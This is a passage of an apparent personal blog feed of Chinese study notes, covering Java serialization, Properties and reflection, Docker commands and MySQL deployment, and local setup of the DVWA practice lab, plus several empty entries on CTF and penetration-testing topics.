&#125;<span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                <span class="hljs-comment">//反序列化</span><br>                                <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));<br>                                System.out.println(ois.readObject());<br>                                System.out.println(ois.readInt());<br>                                ois.close();<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br>                &#125;<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-comment">//序列化的类需要实现Serializable接口</span><br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>                <span class="hljs-built_in">this</span>. name = name;<br>                <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-string">&quot;111&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20231005165817966.png"></p><p>一些其他：(引入<code>Properties</code>类)</p><p><img src="/2023/04/24/java-note/image-20231005200817826.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.FileReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;d:/111/info.txt&quot;</span>;<br>                String line;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(path));<br>                        <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                            <span class="hljs-comment">//循环逐行读取</span><br>                                String[] info = line.split(<span class="hljs-string">&quot;=&quot;</span>);<br>                                <span class="hljs-comment">//split的用途</span><br>                                System.out.println(info[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;:&quot;</span>+info[<span class="hljs-number">1</span>]);<br>                        &#125;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                bufferedReader.close();<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        e.printStackTrace();<br>                &#125;<br><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Properties类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileReader;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;d:/111/info.txt&quot;</span>;<br>                String line;<br>                <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>                properties.load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">&quot;src//mysql.properties&quot;</span>));<br>                <span class="hljs-comment">/**</span><br><span class="hljs-comment">                properties.list(System.out);</span><br><span class="hljs-comment">                //将mysql.properties中的内容打印到控制台</span><br><span class="hljs-comment">                 **/</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">ip</span> <span class="hljs-operator">=</span> properties.getProperty(<span class="hljs-string">&quot;ip&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> properties.getProperty(<span class="hljs-string">&quot;user&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">pwd</span> <span class="hljs-operator">=</span> properties.getProperty(<span class="hljs-string">&quot;passwd&quot;</span>);<br>                System.out.println(ip);<br>                System.out.println(user);<br>                System.out.println(pwd);<br>                properties.setProperty(<span class="hljs-string">&quot;ip&quot;</span>,<span class="hljs-string">&quot;124.70.99.198&quot;</span>);<br>                <span class="hljs-comment">//修改配置文件</span><br>                properties.store(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;src//mysql.properties&quot;</span>),<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">//记得保存配置文件</span><br><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>反射：</p><p>出现如下情况，为Dog类未提供一个无参的构造函数：</p><p><img src="/2023/04/24/java-note/image-20231006025222688.png"></p><p>可以使用Constructor类来进行反射的构造：</p><p><img src="/2023/04/24/java-note/image-20231006025704759.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">import</span> java.io.FileReader;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;all&quot;&#125;)</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>                <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>                properties.load(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">&quot;src//mysql.properties&quot;</span>));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">classpath</span> <span class="hljs-operator">=</span> properties.getProperty(<span class="hljs-string">&quot;classpath&quot;</span>);<span class="hljs-comment">//Main.Dog</span><br>                <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> properties.getProperty(<span class="hljs-string">&quot;methodName&quot;</span>);<span class="hljs-comment">//eat</span><br>                <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Class.forName(classpath);<br>                System.out.println(<span class="hljs-string">&quot;==================&quot;</span>);<br>                System.out.println(cls.getPackage());<br>                <span class="hljs-comment">//获取包名</span><br>                System.out.println(<span class="hljs-string">&quot;==================&quot;</span>);<br>                <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> cls.getConstructor(String.class,<span class="hljs-type">int</span>.class,String.class);<br>                <span class="hljs-comment">//有参构造的类需要像这样创建一个新的类对象构造</span><br>                <span class="hljs-type">Dog</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Dog)constructor.newInstance(<span class="hljs-string">&quot;potato&quot;</span>,<span class="hljs-number">18</span>,<span class="hljs-string">&quot;black&quot;</span>);<br>                <span class="hljs-comment">//Obect o = constructor.newInstance(&quot;abc&quot;,11,&quot;black&quot;);</span><br>                <span class="hljs-comment">//获取实例</span><br>                System.out.println(o.getClass());<br>                System.out.println(<span class="hljs-string">&quot;==================&quot;</span>);<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> o.getClass().getMethod(methodName);<br>                <span class="hljs-comment">//获取到类的方法，也可以cls.getMethod(methodName)</span><br>                m1.invoke(o);<br>                <span class="hljs-comment">//invoke()，调用是来自于哪个对象的方法，此处是名为potato，年龄为18，黑色的Dog对象</span><br>                <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> o.getClass().getField(<span class="hljs-string">&quot;name&quot;</span>);<br>                <span class="hljs-comment">//Field field = o.getClass().getField(&quot;age&quot;);不行，无法读取私有属性</span><br>                Field[] fields = o.getClass().getFields();<br>                System.out.println(<span class="hljs-string">&quot;==================&quot;</span>);<br>                <span class="hljs-keyword">for</span> (Field f : fields)&#123;<br>                        System.out.println(f.getName()+<span class="hljs-string">&quot;=&quot;</span>+o.getClass().getField(f.getName()).get(o));<br>                        <span class="hljs-comment">//输出所有非私有属性以及值</span><br>                &#125;<br>                System.out.println(<span class="hljs-string">&quot;==================&quot;</span>);<br>                System.out.println(field.get(o));<span class="hljs-comment">//potato</span><br>                <span class="hljs-comment">//获取o对象中的name</span><br>                field.set(o,<span class="hljs-string">&quot;lff&quot;</span>);<br>                <span class="hljs-comment">//通过反射给属性赋值</span><br>                System.out.println(field.get(o));<span class="hljs-comment">//lff</span><br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>&#123;<br>        <span class="hljs-keyword">public</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-keyword">public</span> String color;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age,String color)</span>&#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>                <span class="hljs-built_in">this</span>.age = age;<br>                <span class="hljs-built_in">this</span>.color = color;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot; is eating&quot;</span>);<br>        &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20231006034341030.png"></p><p><img src="/2023/04/24/java-note/image-20231006125941000.png"></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP:"></a>JSP:</h2><h2 id="Srping"><a href="#Srping" class="headerlink" title="Srping:"></a>Srping:</h2>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字RCE</title>
    <link href="/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/"/>
    <url>/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_note</title>
    <link href="/2023/04/05/docker-note/"/>
    <url>/2023/04/05/docker-note/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker学习记录"><a href="#Docker学习记录" class="headerlink" title="Docker学习记录"></a>Docker学习记录</h1><p>Windows上一定要先安装WSL。</p><h2 id="复现CTF赛题环境"><a href="#复现CTF赛题环境" class="headerlink" title="复现CTF赛题环境"></a>复现CTF赛题环境</h2><p>作为一名CTF萌新，一切的一切的一切先从如何复现环境开始（</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给了Dockerfile的情况</span><br>docker build -t &lt;容器名&gt; .#注意这里最后有个&quot;.&quot;不能省略<br>docker run -idP &lt;容器名&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给了docker-compose.yml的情况</span><br>docker-compose up -d<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo service docker status#查看docker运行状态<br>sudo service docker start#启动docker<br></code></pre></td></tr></table></figure><h2 id="学习记录"><a href="#学习记录" class="headerlink" title="学习记录"></a>学习记录</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run ubuntu:20.04 /bin/echo &quot;hello world&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">run 代表运行一个容器，unbuntu:20.04代表镜像(images)，由ubuntu:20.04镜像创建一个新的容器并运行。后面的/bin/echo代表执行该容器/bin/下的<span class="hljs-built_in">echo</span>命令</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151409875.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -it ubuntu:20.04 /bin/bash<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-i：允许容器内的标准输出进行交互</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">-t：在新容器内指定一个伪终端或终端</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果不存在该镜像则自动拉取安装一个</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151607565.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入容器之后想退出</span><br>root@&lt;容器ID&gt;:/# exit<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405151900721.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d ubuntu:20.04 /bin/echo &quot;hello world&quot;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">-d表示在后台运行</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">上述指令执行完之后并没有回显<span class="hljs-string">&quot;hello world&quot;</span>,而是显示容器的ID，说明容器被启动</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152208455.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker ps#查看正在运行的容器<br>docker ps -a#查看所有容器<br>docker ps -l#查看最后一次创建的容器<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152453409.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker logs &lt;ID/容器名&gt; #查看容器标准输出<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405152752058.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker stop &lt;ID/容器名&gt;#停止容器<br>docker restart &lt;ID/容器名&gt;#重启容器<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull &lt;镜像名&gt;#拉取镜像<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -itd --name &lt;容器名&gt; &lt;镜像名&gt; /bin/bash<br><span class="hljs-meta prompt_">#</span><span class="language-bash">希望容器在后台运行，并给该容器命名</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">要注意的是加上<span class="hljs-string">&quot;-d&quot;</span>默认在后台运行不进入容器，要进入容器用docker attach或docker <span class="hljs-built_in">exec</span></span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153402534.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker attach &lt;ID/容器名&gt;#进入容器，exit后容器停止<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153636733.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker exec -it &lt;ID/容器名&gt; /bin/bash#exit之后容器在后台运行不关闭<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405153831456.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker export &lt;ID/容器名&gt; &gt; ./ubuntu.tar#向当前目录导出某个容器<br>cat ./ubuntu.tar | docker import -&lt;容器名&gt;:&lt;tag&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rm -f &lt;ID/容器名&gt; #删除某容器<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rename &lt;old_name&gt; &lt;new_name&gt;#重命名某容器<br></code></pre></td></tr></table></figure><h3 id="Web应用"><a href="#Web应用" class="headerlink" title="Web应用"></a>Web应用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -P training/webapp python app.py<br><span class="hljs-meta prompt_">#</span><span class="language-bash">大写的-P代表随机映射一个端口</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405154618159.png"></p><p>访问本地32768端口</p><p><img src="/2023/04/05/docker-note/image-20230405154729584.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">小写的-p代表指定映射的ip和端口，但是在一个指定端口上只能绑定一个容器</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">格式：hostPort:containerPort、ip:hostPort:containerPort、ip::containerPort</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405155352141.png"></p><p>访问本地23333端口</p><p><img src="/2023/04/05/docker-note/image-20230405155430720.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker logs &lt;ID/容器名&gt;#查看截止当前的web应用日志（静态）<br>docker logs -f &lt;ID/容器名&gt;#查看实时web日志（动态）<br></code></pre></td></tr></table></figure><p><img src="/2023/04/05/docker-note/image-20230405155849636.png"></p><h3 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker rmi &lt;镜像名&gt;#删除镜像，rmi中的i是images的意思<br>docker images#查看镜像，复现Dockerfile第一步命令后可以用一下看看是否创建成功镜像<br></code></pre></td></tr></table></figure><hr><h2 id="Docker-部署-MySQL"><a href="#Docker-部署-MySQL" class="headerlink" title="Docker 部署 MySQL"></a>Docker 部署 MySQL</h2><p>先pull一个镜像</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker pull mysql<br></code></pre></td></tr></table></figure><p><code>docker images</code>可以查看是否成功拉取镜像</p><p>创建容器并进行端口映射：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker <span class="hljs-keyword">run</span><span class="language-bash"> -d -p &lt;port&gt;:3306 --name &lt;容器名&gt; -e MYSQL_ROOT_PASSWORD=&lt;密码&gt; mysql</span><br></code></pre></td></tr></table></figure><p><code>docker ps</code>可以查看是否成功创建容器</p><p>启动容器：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker start &lt;容器名/ID&gt;<br></code></pre></td></tr></table></figure><p>容器启动后，进入容器：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">docker exec -it &lt;容器名/ID&gt; /bin/bash<br></code></pre></td></tr></table></figure><p>进入MySQL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u root -p &lt;密码&gt;<br></code></pre></td></tr></table></figure><p>修改新密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;&lt;新密码&gt;&#x27;;<br></code></pre></td></tr></table></figure><p>开启MySQL远程连接权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE USER &lt;用户名&gt; IDENTIFIED BY &#x27;&lt;远程密码&gt;&#x27;;#创建远程用户<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;&lt;用户名&gt;&#x27;@&#x27;%&#x27;;#分配权限<br>FLUSH PRIVILEGES;#刷新权限<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA</title>
    <link href="/2023/03/28/DVWA/"/>
    <url>/2023/03/28/DVWA/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建DVWA靶场"><a href="#搭建DVWA靶场" class="headerlink" title="搭建DVWA靶场"></a>搭建DVWA靶场</h1><h2 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h2><p>(1)<a href="https://blog.csdn.net/qq_44803335/article/details/108806851">本地配置好php环境</a></p><p>(2)下载DVWA源码：<a href="https://github.com/digininja/DVWA/archive/master.zip">https://github.com/digininja/DVWA/archive/master.zip</a></p><h2 id="具体步骤："><a href="#具体步骤：" class="headerlink" title="具体步骤："></a>具体步骤：</h2><p>1、下载并安装PHPstudy；</p><p>2、将解压后的DVWA源码放置在phpstudy安装目录的WWW文件夹；</p><p><img src="/2023/03/28/DVWA/image-20230406231241712.png"></p><p>3.进入DVWA&#x2F;config目录，将config.inc.php.dist最后的.dist删去；</p><p>4、打开刚刚重命名的config.inc.php文件，修改db_user和db_password为”root”、”root”；</p><p><img src="/2023/03/28/DVWA/image-20230406231943662.png"></p><p>5、PHPstudy中启动服务器，访问<a href="http://127.0.0.1/DVWA/setup.php">http://127.0.0.1/DVWA/setup.php</a>(或<a href="http://localhost/DVWA/setup.php">http://localhost/DVWA/setup.php)</a>)点击最下方的Creat Database；</p><p><img src="/2023/03/28/DVWA/image-20230406232851826.png"></p><p>如图所示就算启动成功了。</p><p>6、访问<a href="http://127.0.0.1/DVWA/">http://127.0.0.1/DVWA/</a>(或<a href="http://localhost/DVWA/">http://localhost/DVWA/)</a>)，输入用户名”admin”密码”password”登录即可</p><h1 id="DVWA靶场学习记录"><a href="#DVWA靶场学习记录" class="headerlink" title="DVWA靶场学习记录"></a>DVWA靶场学习记录</h1>]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>自建靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploit</title>
    <link href="/2023/03/28/Metasploit/"/>
    <url>/2023/03/28/Metasploit/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>学习记录</category>
      
      <category>渗透工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NSSCTF</title>
    <link href="/2023/03/11/NSSCTF/"/>
    <url>/2023/03/11/NSSCTF/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>做题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>Misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF</title>
    <link href="/2023/03/09/BUUCTF/"/>
    <url>/2023/03/09/BUUCTF/</url>
    
